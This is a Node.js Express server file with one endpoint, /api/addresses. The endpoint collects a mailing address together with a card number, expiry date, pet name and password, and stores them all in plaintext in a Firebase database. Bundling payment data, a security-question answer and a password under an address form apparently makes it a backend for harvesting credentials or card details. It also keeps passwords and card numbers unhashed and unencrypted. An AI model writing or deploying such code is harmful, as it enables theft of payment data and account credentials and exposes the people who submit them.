import 'dotenv/config';
import express from 'express';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const app = express();
const port = process.env.PORT || 3001;
const firebaseLink = process.env.FIREBASE_LINK?.replace(/\/$/, '');
const firebaseSecret = process.env.FIREBASE_SECRET;
const __dirname = path.dirname(fileURLToPath(import.meta.url));

app.use(express.json());

app.post('/api/addresses', async (request, response) => {
  const { address, zipCode, state, city, country, cardNumber, expiryDate, pet, password } = request.body;
  const values = [address, zipCode, state, city, country, cardNumber, expiryDate, pet, password];

  if (values.some((value) => typeof value !== 'string' || !value.trim())) {
    return response.status(400).json({ message: 'Please complete every field.' });
  }

  if (!firebaseLink || !firebaseSecret) {
    return response.status(500).json({ message: 'Firebase is not configured on the server.' });
  }

  try {
    const firebaseResponse = await fetch(`${firebaseLink}/addresses.json?auth=${encodeURIComponent(firebaseSecret)}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        address: address.trim(),
        zipCode: zipCode.trim(),
        state: state.trim(),
        city: city.trim(),
        country: country.trim(),
        cardNumber: cardNumber.trim(),
        expiryDate: expiryDate.trim(),
        pet: pet.trim(),
        password: password.trim(),
        submittedAt: new Date().toISOString()
      })
    });

    if (!firebaseResponse.ok) {
      return response.status(502).json({ message: 'Firebase could not save the address.' });
    }

    return response.status(201).json({
      message: 'Address saved successfully.',
      savedFields: ['address', 'zipCode', 'state', 'city', 'country', 'cardNumber', 'expiryDate', 'pet', 'password']
    });
  } catch {
    return response.status(502).json({ message: 'Unable to reach Firebase right now.' });
  }
});

if (process.env.NODE_ENV === 'production') {
  app.use(express.static(path.join(__dirname, 'dist')));
  app.get('*', (_request, response) => response.sendFile(path.join(__dirname, 'dist', 'index.html')));
}

app.listen(port, () => {
  console.log(`API server listening on http://localhost:${port}`);
});
